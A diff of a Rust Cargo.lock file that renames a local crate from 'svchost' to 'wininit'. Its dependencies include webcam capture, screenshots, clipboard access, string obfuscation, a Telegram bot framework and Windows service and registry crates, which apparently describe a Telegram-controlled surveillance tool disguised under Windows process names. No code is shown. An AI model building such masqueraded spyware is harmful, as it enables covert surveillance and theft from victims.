@@ -3304,33 +3304,6 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "13c2bddecc57b384dee18652358fb23172facb8a2c51ccc10d74c157bdea3292"
 
 [[package]]
-name = "svchost"
-version = "1.1.0"
-dependencies = [
- "anyhow",
- "base64",
- "chrono",
- "clipboard-win",
- "dotenvy",
- "fern",
- "hex",
- "image 0.25.10",
- "log",
- "nokhwa",
- "obfstr",
- "reqwest 0.13.2",
- "screenshots",
- "sha2",
- "sysinfo",
- "teloxide",
- "tokio",
- "windows-service",
- "windows-sys 0.61.2",
- "winreg",
- "winres",
-]
-
-[[package]]
 name = "syn"
 version = "2.0.117"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -4578,6 +4551,33 @@ name = "windows_x86_64_msvc"
 version = "0.52.6"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "589f6da84c646204747d1270a2a5661ea66ed1cced2631d546fdfb155959f9ec"
+
+[[package]]
+name = "wininit"
+version = "1.1.0"
+dependencies = [
+ "anyhow",
+ "base64",
+ "chrono",
+ "clipboard-win",
+ "dotenvy",
+ "fern",
+ "hex",
+ "image 0.25.10",
+ "log",
+ "nokhwa",
+ "obfstr",
+ "reqwest 0.13.2",
+ "screenshots",
+ "sha2",
+ "sysinfo",
+ "teloxide",
+ "tokio",
+ "windows-service",
+ "windows-sys 0.61.2",
+ "winreg",
+ "winres",
+]
 
 [[package]]
 name = "winreg"
